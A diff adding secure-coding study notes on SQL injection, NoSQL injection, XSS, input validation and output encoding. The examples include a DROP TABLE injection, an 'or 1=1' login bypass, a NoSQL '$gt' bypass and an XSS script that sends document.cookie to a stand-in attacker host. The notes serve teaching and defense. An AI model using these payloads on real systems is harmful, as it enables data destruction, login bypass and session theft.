@@ -509,12 +509,33 @@ var person = {
 	- TLS (former: Secure Sockets Layer, SSL)
 		- Authenticate transmission parties (mainly the server) using public-key encryption
 		- Use symmetric key encryption to encrypt the data transmitted
-		- 
-
-		
-		
-		
-		
+- User input vulnerabilities
+	- User input:
+		- For DB operation: SQL injection
+		- Embedded as response to the user: Cross-site scripting (XSS)
+		- To solve this problem: validate input, use safe encoding
+	- SQL injection example:
+		- Table drop:
+			- INSERT INTO students (last_name, first_name) VALUES ('XKCD', '/*Robert’); DROP TABLE Students;-- */')
+		- Login bypass:
+			- SELECT * FROM users WHERE username = '/* ' or 1=1--*/' AND password = ''
+		- NoSQL injection:
+			- db.users.find({username: /*{"$gt": ""}*/, password: /*{"$gt": ""}*/});
+	- XSS example: response contains executable script from user input
+		- ```<script>var img = document.createElement(“img”);
+			img.src = ‘http://evil.martinfowler.com/steal?' + document.cookie; </script> ```
+		- This content is assigned to variable "communicationType" which will be sent by code 
+			```res.send("Can't send by type " + communicationType));```
+- Input handling:
+	- Positive validation and white-list
+		- email address, valid value range
+	- Negative validation and blacklist
+		- filter <script> tag
+	- Input sanitization
+		- remove undesirable input rather than reject whole input
+- Output encoding
+	- Unescaped: <script> alert(“hello”);</script>
+	- Escaped: &lt;script&gt;alert(&quot;hello&quot;);&lt;/script&gt;
 		
 		
 		
